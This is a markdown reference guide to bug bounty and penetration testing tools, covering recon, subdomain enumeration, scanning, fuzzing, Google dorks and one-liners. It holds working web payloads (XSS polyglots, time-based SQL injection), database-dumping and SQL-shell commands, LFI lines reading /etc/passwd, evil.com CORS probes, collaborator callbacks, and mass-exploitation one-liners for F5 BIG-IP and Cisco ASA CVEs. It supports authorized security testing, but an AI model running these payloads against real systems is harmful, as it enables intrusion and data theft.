# Tools and Commands Reference Guide

ABOUTME: Comprehensive reference guide for bug bounty and penetration testing tools and commands
ABOUTME: Organized by category with installation instructions, usage examples, and troubleshooting tips

## Table of Contents

- [Reconnaissance Tools](#reconnaissance-tools)
- [Subdomain Enumeration](#subdomain-enumeration) 
- [Port Scanning & Service Discovery](#port-scanning--service-discovery)
- [Web Application Scanning](#web-application-scanning)
- [Vulnerability Scanners](#vulnerability-scanners)
- [XSS Testing Tools](#xss-testing-tools)
- [SQL Injection Tools](#sql-injection-tools)
- [Directory & File Discovery](#directory--file-discovery)
- [API & Parameter Discovery](#api--parameter-discovery)
- [JavaScript Analysis](#javascript-analysis)
- [Docker Usage](#docker-usage)
- [One-Liner Commands](#one-liner-commands)
- [Google Dorks](#google-dorks)

---

## Reconnaissance Tools

### Shodan (via sqry)

**Installation:**
```bash
go install github.com/kdairatchi/sqry@latest
```

**Basic Usage:**
```bash
# Search for Apache servers
sqry -q "apache" --json --limit 50

# Find exposed services on specific ports
sqry -q "port:80" --json --limit 50
sqry -q "port:443" --json --limit 50
sqry -q "port:8080" --json --limit 50

# Search with organization filter
sqry -q 'org:"Google LLC"'

# Search with country filter
sqry -q "apache" --country US --json --limit 10
```

**Advanced Commands:**
```bash
# Find vulnerable Apache servers in US
sqry -q "apache" --country US --json --limit 10

# Get all open ports for specific IP
sqry -q "ip:<target_ip>" --ports --json

# Find SSL-enabled hosts with domains
sqry -q "ssl:true" --domains --with-domains

# Search for vulnerable systems with CVEs
sqry -q "product:apache" --join-cves --focus-vulns --json

# Find devices with screenshots
sqry -q "http" --httpx --screenshot --limit 20
```

**Integration with Other Tools:**
```bash
# Pipe results to nmap
sqry -q "apache" | xargs -I {} nmap -sV {}

# Save and count results
sqry -q "apache" | tee ips.txt | wc -l

# Filter private IPs
sqry -q "apache" | grep -v "^10\." > public_ips.txt
```

### LazyHunter (hunter.py)

**Installation:**
```bash
git clone https://github.com/your-repo/lazyhunter.git
cd lazyhunter
pip install -r requirements.txt
```

**Usage:**
```bash
# Scan IP for CVEs and ports
python3 hunter.py --cve+ports --target <target_ip> --json-output results.json

# Bulk scan multiple IPs
python3 hunter.py --cve+ports --target targets.txt --json-output bulk_scan.json

# Quick hostname and port scan
python3 hunter.py --host --ports --target <target_ip> --json-output quick_scan.json

# Enhanced scan with screenshots and HTML output
python3 hunter.py ips.txt --cves+ports --html-output html.html --screenshots
```

---

## Subdomain Enumeration

### Subfinder

**Installation:**
```bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

**Basic Usage:**
```bash
# Simple subdomain enumeration
subfinder -d <domain> -o subdomains.txt

# Silent mode (no verbose output)
subfinder -d <domain> -silent -o subdomains.txt

# Use all available sources
subfinder -d <domain> -all -o subdomains.txt

# Recursive enumeration
subfinder -d <domain> -all -recursive > subdomains.txt
```

**Advanced Examples:**
```bash
# Combine with other tools for live subdomain detection
subfinder -d example.com -silent | httpx -silent | anew live_subdomains.txt

# Filter and probe live subdomains
cat subdomains.txt | httpx-toolkit -title -sc -tech -threads 200 | tee live_subs.txt | grep -I "200" > live_200.txt
```

### Assetfinder

**Installation:**
```bash
go get -u github.com/tomnomnom/assetfinder
```

**Usage:**
```bash
# Find subdomains only
assetfinder --subs-only <domain>

# Pipe to other tools for verification
assetfinder --subs-only <domain> | httprobe
```

### Amass

**Installation:**
```bash
go install -v github.com/OWASP/Amass/v3/...@master
```

**Usage:**
```bash
# Basic subdomain enumeration
amass enum -d <domain> -o subdomains.txt

# Brute force enumeration
amass enum -d <domain> -brute -o subdomains.txt

# Create visualization
amass viz -i <subdomains_file> -o graph.png
```

### Manual Subdomain Discovery APIs

**VirusTotal:**
```bash
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>" | jq -r '.domain_siblings[]'
```

**BufferOver:**
```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```

**CertSpotter:**
```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

---

## Port Scanning & Service Discovery

### Nmap

**Basic Scans:**
```bash
# Basic service version scan
nmap -sV <target_ip>

# Aggressive scan with OS detection
nmap -A <target_ip>

# Ping scan for range
nmap -sP <target_range>

# Full port scan with timing
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
```

**Advanced Scripts:**
```bash
# Vulnerability scanning
nmap --script=http-enum,vuln/scanners/http-title-fingerprinting 192.168.1.*

# SSL certificate information
nmap --script ssl-cert -p 443 <IP Address>
```

### Masscan

**Installation:**
```bash
# Ubuntu/Debian
sudo apt-get install masscan

# Build from source
git clone https://github.com/robertdavidgraham/masscan
cd masscan
make
```

**Usage:**
```bash
# Scan all ports at high speed
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt

# Scan specific ports
masscan -p80,443,8080 target.com --rate 10000
```

### Naabu

**Installation:**
```bash
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
```

**Usage:**
```bash
# Basic port scan
naabu -host target.com

# Scan from IP list with nmap integration
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

# High-rate scanning without CloudFlare
subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

---

## Web Application Scanning

### Httpx

**Installation:**
```bash
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

**Basic Usage:**
```bash
# Probe URLs from stdin
cat urls.txt | httpx

# Get status codes and titles
cat subdomains.txt | httpx -status-code -title

# Filter live hosts with specific status codes
cat subdomains.txt | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

**Advanced Features:**
```bash
# Technology detection
cat subdomains.txt | httpx -tech -title -status-code

# Custom headers
cat urls.txt | httpx -H "User-Agent: Custom-Agent"

# Path fuzzing
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\*|\$[^\:]*):0:0:'
```

### Katana (Web Crawler)

**Installation:**
```bash
go install github.com/projectdiscovery/katana/cmd/katana@latest
```

**Usage:**
```bash
# Basic crawling
katana -u https://example.com

# Deep crawling with filtering
katana -u target.com -d 5 -jc -f qurl -ef woff,css,png,svg,jpg,woff2,jpeg,gif

# Crawl with passive sources
katana -u target.com -d 5 waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

# JavaScript file discovery
echo ferrari.com | katana -d 5 | grep -E '\.js$' | nuclei -t nuclei-templates -c 30
```

---

## Vulnerability Scanners

### Nuclei

**Installation:**
```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Update templates
nuclei -update-templates
```

**Basic Usage:**
```bash
# Scan single target
nuclei -target https://example.com

# Scan multiple targets
nuclei -list urls.txt

# Use specific templates
nuclei -list urls.txt -t nuclei-templates/http/exposures/

# Tag-based scanning
nuclei -target example.com -tags exposure,xss,sqli
```

**Advanced Examples:**
```bash
# Custom templates directory
nuclei -l urls_only.txt -t nuclei-templates/Custom

# Subdomain takeover detection
subfinder -d example.com | httpx -silent > subdomains.txt
nuclei -t nuclei-templates/http/takeovers -l subdomains.txt

# Integration with other tools
subfinder -d intigriti.com | httpx | nuclei -tags exposure -o output.txt
```

---

## XSS Testing Tools

### Dalfox

**Installation:**
```bash
go install github.com/hahwul/dalfox/v2@latest
```

**Basic Usage:**
```bash
# Single URL testing
dalfox url "https://example.com/search?q=test"

# File input mode
dalfox file urls.txt

# Pipe mode with other tools
echo https://example.com | dalfox pipe
```

**Advanced Workflows:**
```bash
# Wayback URLs + GF + Dalfox pipeline
waybackurls target.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b burpcollaborator.net pipe > output.txt

# Katana + Dalfox integration
echo target.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav

# GoSpider + Dalfox
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt
```

### KXSS

**Installation:**
```bash
go get -u github.com/Emoe/kxss
```

**Usage:**
```bash
# Basic XSS detection
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
```

### XSS Payloads

**Context Breakers:**
```html
# HTML Context
</tag><svg onload=alert()>

# Attribute Context  
"><svg onload=alert()>
onmouseover=alert()

# JavaScript Context
'-alert()-'
}</script><svg onload=alert()>
```

**Polyglots:**
```html
%0ajavascript:/*\\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">
```

---

## SQL Injection Tools

### Ghauri

**Installation:**
```bash
pip3 install ghauri
```

**Basic Usage:**
```bash
# Simple scan
ghauri -u "http://www.site.com/vuln.php?id=1"

# Database enumeration
ghauri -u "http://www.site.com/vuln.php?id=1" --dbs

# Table enumeration
ghauri -u "http://www.site.com/vuln.php?id=1" -D database_name --tables

# Column enumeration
ghauri -u "http://www.site.com/vuln.php?id=1" -D database_name -T table_name --columns

# Data dumping
ghauri -u "http://www.site.com/vuln.php?id=1" -D database_name -T table_name --dump
```

**Advanced Options:**
```bash
# Specify techniques
ghauri -u "http://www.site.com/vuln.php?id=1" --technique "TUB"

# Multithreading
ghauri -u "http://www.site.com/vuln.php?id=1" --threads 5

# Bulk testing
ghauri -m /path/to/targets.txt

# Interactive SQL shell
ghauri -u "http://www.site.com/vuln.php?id=1" --sql-shell
```

**Time-Based SQLi Payloads:**
```sql
0' XOR (IF(NOW()=SYSDATE(), SLEEP(20), 0)) XOR 'Z
1234 AND SLEEP(20)
'; WAITFOR DELAY '00:00:05';--
paramname=1' -IF (1=1, SLEEP(20), 0) AND paramname='1
```

### SQLMap Integration Pipeline

```bash
# GAU + GF + SQLMap workflow
subfinder -d vulnweb.com -all -silent | gau -t 50 | uro | gf sqli > sql.txt
ghauri -m sql.txt --batch --dbs --level 3 --confirm
```

---

## Directory & File Discovery

### FFUF

**Installation:**
```bash
go get -u github.com/ffuf/ffuf
```

**Basic Directory Fuzzing:**
```bash
# Basic fuzzing
ffuf -w /path/to/wordlist.txt -u https://target.com/FUZZ

# Extension fuzzing
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.txt,.html,.js

# Recursive fuzzing with multiple extensions
ffuf -w /Users/anom/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -t 100 -r -o results.json
```

**LFI Testing:**
```bash
# Request file method for LFI
ffuf -request lfi -request-proto https -w /root/wordlists/lfi-payloads.txt -c -mr 'root:'

# URL-based LFI testing
echo 'https://canva.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v
```

**XSS Testing:**
```bash
# XSS payload fuzzing
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'
```

### Gobuster

**Installation:**
```bash
go install github.com/OJ/gobuster/v3@latest
```

**Usage:**
```bash
# Directory brute forcing
gobuster dir -u https://target.com -w /path/to/wordlist.txt

# Subdomain enumeration
gobuster dns -d target.com -w /path/to/subdomain-wordlist.txt

# Virtual host discovery
gobuster vhost -u https://target.com -w /path/to/vhost-wordlist.txt
```

---

## API & Parameter Discovery

### Arjun

**Installation:**
```bash
pip3 install arjun
```

**Usage:**
```bash
# Basic parameter discovery
arjun -u https://site.com/endpoint.php

# Advanced parameter discovery with custom wordlist
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'

# Passive parameter discovery
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'
```

**Integration with KXSS:**
```bash
# Arjun + KXSS parameter fuzzing
arjun -q -u $url -oT arjun.txt && cat arjun.txt | awk -F'[?&]' '{baseUrl=$1; for (i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
```

---

## JavaScript Analysis

### GAU (Get All URLs)

**Installation:**
```bash
go install github.com/lc/gau/v2/cmd/gau@latest
```

**Usage:**
```bash
# Fetch URLs for domain
gau example.com

# Fetch with specific thread count
gau --threads 5 example.com >> endpoints.txt

# Fetch URLs with status code filtering
echo etsy.com | gau --mc 200 | urldedupe >> etsyurls.txt
```

**JavaScript-Specific Workflows:**
```bash
# JavaScript file discovery
waybackurls target.com | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} python3 lazyegg.py "{}" --js_urls --domains --ips > js_urls.txt

# Extract API endpoints from JS files
curl -s https://target.com/main.js | sed 's/\./\n/g' | grep '/api/' | sort -u | grep -o -E '(https?://)?/?[{}a-z0–9A-Z_\.-]{2,}/[{}/a-z0–9A-Z_\.-]+'
```

### JSLuice

**Usage:**
```bash
# Extract URLs and parameters from JS
echo "https://lernmedien.post.ch" | jsluice urls <(curl -sk "$url") | jq -r '.url, .queryParams[], .bodyParams[], .method' | sed 's/null//g' | awk '{ORS=NR%6?",":"\n"}1'
```

### LinkFinder

**Installation:**
```bash
git clone https://github.com/GerbenJavado/LinkFinder.git
cd LinkFinder
pip3 install -r requirements.txt
```

**Usage:**
```bash
# Analyze single JS file
python linkfinder.py -i https://example.com/script.js -o cli

# Batch processing
cat js_files.txt | while IFS= read link; do python linkfinder.py -i "$link" -o cli; done
```

---

## Docker Usage

### BlackWidow Scanner

**Setup:**
```bash
git clone https://github.com/1N3/BlackWidow.git
cd BlackWidow
docker build -t blackwidow .
docker run -it blackwidow
```

---

## One-Liner Commands

### LFI Detection
```bash
# Fast LFI detection
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

# Waymore + FFUF LFI testing
waymore -i "" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
```

### Open Redirect Detection
```bash
# Open redirect testing
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

### XSS Detection
```bash
# Comprehensive XSS testing
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt

# Simple XSS detection without gf
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
```

### Multi-Header XSS/SSRF Testing
```bash
# Header-based XSS and SSRF testing
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do 
  xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.burpcollaborator'|grep xss) 
  xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.burpcollaborator'|grep xss) 
  xss3=$(curl -s -L $url -H 'Host: xss.burpcollaborator'|grep xss) 
  xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2)
  echo -e "\e[1;32m$url\e[0m\nMethod[1] X-Forwarded-For: xss+ssrf => $xss1\nMethod[2] X-Forwarded-Host: xss+ssrf ==> $xss2\nMethod[3] Host: xss+ssrf ==> $xss3\nMethod[4] GET http://xss.burpcollaborator HTTP/1.1"
done
```

### CORS Testing
```bash
# CORS misconfiguration testing
curl -H 'Origin: https://evil.com' -I https://www.google.com | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'

# Automated CORS testing
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then echo "[Potential CORS Found] $url"; else echo "Nothing on $url"; fi; done
```

### CVE-Specific Testing

**CVE-2020-5902 (F5 BIG-IP):**
```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```

**CVE-2020-3452 (Cisco ASA):**
```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[VULNERABLE] $LINE" || echo -e "[NOT VULNERABLE] $LINE"; done < HOSTS.txt
```

---

## Google Dorks

### Information Disclosure
```
site:*.target.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

### XSS-Prone Parameters
```
inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example.com
```

### Open Redirect Parameters
```
inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com
```

### SQLi-Prone Parameters
```
inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example.com
```

### SSRF-Prone Parameters
```
inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:& site:example.com
```

### LFI-Prone Parameters
```
inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example.com
```

### RCE-Prone Parameters
```
inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read= | inurl:ping= inurl:& site:example.com
```

---

## Configuration & API Keys

### API Key Setup

**Shodan:**
```bash
# Set API key for shodan/sqry
export SHODAN_API_KEY="your_api_key_here"
```

**VirusTotal:**
```bash
# Use in scripts
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=<DOMAIN>"
```

### Tool Configuration Files

**Subfinder Config:**
```yaml
# ~/.config/subfinder/provider-config.yaml
virustotal:
  - your_virustotal_api_key
shodan:
  - your_shodan_api_key
```

**Amass Config:**
```ini
# ~/.config/amass/config.ini
[data_sources.VirusTotal]
ttl = 1440
apikey = your_virustotal_api_key
```

---

## Troubleshooting

### Common Issues

**Rate Limiting:**
```bash
# Add delays and reduce thread counts
ffuf -w wordlist.txt -u https://target.com/FUZZ -t 10 -delay 1s

# Use rate limiting with tools
arjun -u https://site.com --rate-limit 10
```

**WAF Bypass:**
```bash
# Use random user agents
ffuf -w wordlist.txt -u https://target.com/FUZZ -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Add custom headers
httpx -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1"
```

**DNS Resolution Issues:**
```bash
# Use custom DNS servers
subfinder -d example.com -r 8.8.8.8,1.1.1.1

# Check DNS resolution
dig example.com @8.8.8.8
```

---

## Performance Optimization

### Threading & Concurrency
```bash
# Optimize thread counts for different tools
httpx -threads 100
nuclei -c 50
katana -c 50
ffuf -t 100
```

### Resource Management
```bash
# Monitor resource usage
top -p $(pgrep nuclei)

# Limit memory usage
ulimit -m 2097152  # 2GB limit
```

### Network Optimization
```bash
# Increase connection limits
echo 'net.core.somaxconn = 65535' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_max_syn_backlog = 65535' >> /etc/sysctl.conf
```

---

## Tool Integration Workflows

### Complete Recon Pipeline
```bash
#!/bin/bash
domain=$1

# 1. Subdomain enumeration
subfinder -d $domain -all -silent > subs.txt
assetfinder --subs-only $domain >> subs.txt
amass enum -norecursive -noalts -d $domain >> subs.txt

# 2. Live subdomain detection
cat subs.txt | sort -u | httpx -silent > live_subs.txt

# 3. Port scanning
cat live_subs.txt | naabu -silent -verify > ports.txt

# 4. Technology detection
cat live_subs.txt | httpx -tech -title -status-code > tech_stack.txt

# 5. Vulnerability scanning
nuclei -l live_subs.txt -t nuclei-templates/ -o vulns.txt

# 6. Directory fuzzing
cat live_subs.txt | while read url; do
  ffuf -w /path/to/wordlist.txt -u $url/FUZZ -mc 200,301,302,403 -o ffuf_$url.json
done
```

### Bug Bounty Automation Script
```bash
#!/bin/bash
target=$1

echo "[+] Starting recon for $target"

# Subdomain enumeration
echo "[+] Finding subdomains..."
subfinder -d $target -all -recursive > ferrari.txt

# URL discovery
echo "[+] Discovering URLs..."
cat ferrari.txt | gau -t 50 | uro | tee all_urls.txt

# Parameter extraction
echo "[+] Finding parameters..."
cat all_urls.txt | gf sqli > sql.txt
cat all_urls.txt | gf xss > xss.txt
cat all_urls.txt | gf lfi > lfi.txt

# Vulnerability testing
echo "[+] Testing for SQLi..."
ghauri -m sql.txt --batch --dbs --level 3 --confirm

echo "[+] Testing for XSS..."
cat xss.txt | dalfox pipe --skip-bav

echo "[+] Testing for LFI..."
cat lfi.txt | sed 's/=.*/=/' | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

echo "[+] Recon complete!"
```

---

## Best Practices

1. **Always use rate limiting** to avoid overwhelming targets
2. **Respect robots.txt** and bug bounty program scope
3. **Use proxy chains** for sensitive testing
4. **Log all activities** for reporting and debugging
5. **Keep tools updated** regularly
6. **Backup configurations** and wordlists
7. **Test on authorized targets only**
8. **Document findings** properly with proof-of-concept

---

*Last updated: 2024-12-30*